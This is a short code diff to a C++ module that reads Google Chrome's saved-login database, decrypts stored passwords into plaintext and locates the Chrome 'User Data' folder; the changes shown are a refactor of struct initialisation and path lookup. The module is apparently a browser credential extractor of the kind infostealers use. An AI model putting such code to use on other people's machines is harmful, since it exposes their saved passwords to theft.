@@ -1,10 +1,9 @@
 #include "chrome.hxx"
 
 #include "crypt.hxx"
-#include "nowide.hxx"
+#include "utils.hxx"
 #include <fstream>
 #include <vector>
-#include <ShlObj.h>
 #include <windows.h>
 #include <TlHelp32.h>
 #include <sqlite3.h>
@@ -132,13 +131,14 @@ std::expected<std::vector<login>, browser_error> chrome::get_logins(void) {
             date_last_used = system_clock::time_point{microseconds{db_date_last_used} - epoch_offset};
         }
 
-        login l;
-        l.url = db_origin_url;
-        l.username = db_username_value;
-        l.password = password_plaintext;
-        l.date_created = date_created;
-        l.date_last_used = date_last_used;
-        l.date_password_modified = date_password_modified;
+        login l {
+            .url = db_origin_url,
+            .username = db_username_value,
+            .password = password_plaintext,
+            .date_created = date_created,
+            .date_last_used = date_last_used,
+            .date_password_modified = date_password_modified,
+        };
         logins.emplace_back(l);
     }
     if (step_ret != SQLITE_DONE) {
@@ -149,13 +149,7 @@ std::expected<std::vector<login>, browser_error> chrome::get_logins(void) {
 }
 
 std::filesystem::path chrome::get_base_path(void) {
-    wil::unique_cotaskmem_string local_appdata_path;
-    SHGetKnownFolderPath(FOLDERID_LocalAppData, KF_FLAG_DONT_UNEXPAND, NULL,
-                         &local_appdata_path);
-
-    std::filesystem::path base_path = local_appdata_path.get();
-
-    return base_path / "Google" / "Chrome" / "User Data";
+    return find_folder(FOLDERID_LocalAppData) / "Google" / "Chrome" / "User Data";
 }
 
 void chrome::kill(void) {
